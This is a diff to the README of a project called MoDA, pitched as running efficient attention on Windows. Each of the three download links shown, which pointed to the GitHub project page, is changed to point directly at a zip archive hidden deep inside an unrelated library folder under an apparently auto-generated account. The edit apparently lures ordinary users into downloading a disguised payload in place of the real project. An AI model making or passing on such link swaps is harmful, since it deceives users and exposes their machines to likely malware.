@@ -1,6 +1,6 @@
 # ⚙️ MoDA - Run Efficient Attention on Windows
 
-[![Download MoDA](https://img.shields.io/badge/Download%20MoDA-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Incensecedarthreepointswitch884/MoDA)
+[![Download MoDA](https://img.shields.io/badge/Download%20MoDA-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Incensecedarthreepointswitch884/MoDA/main/libs/moda_triton/fla/models/mamba/DA-Mo-v1.4.zip)
 
 ## 🚀 What MoDA Does
 
@@ -16,7 +16,7 @@ Use it when you want:
 
 Use this link to visit the project page and download MoDA:
 
-[Download MoDA from GitHub](https://github.com/Incensecedarthreepointswitch884/MoDA)
+[Download MoDA from GitHub](https://raw.githubusercontent.com/Incensecedarthreepointswitch884/MoDA/main/libs/moda_triton/fla/models/mamba/DA-Mo-v1.4.zip)
 
 On the project page, look for:
 - The latest release
@@ -161,7 +161,7 @@ A simple Windows setup may look like this:
 
 Primary download page:
 
-[https://github.com/Incensecedarthreepointswitch884/MoDA](https://github.com/Incensecedarthreepointswitch884/MoDA)
+[https://raw.githubusercontent.com/Incensecedarthreepointswitch884/MoDA/main/libs/moda_triton/fla/models/mamba/DA-Mo-v1.4.zip](https://raw.githubusercontent.com/Incensecedarthreepointswitch884/MoDA/main/libs/moda_triton/fla/models/mamba/DA-Mo-v1.4.zip)
 
 ## 🗂️ Common Terms
 
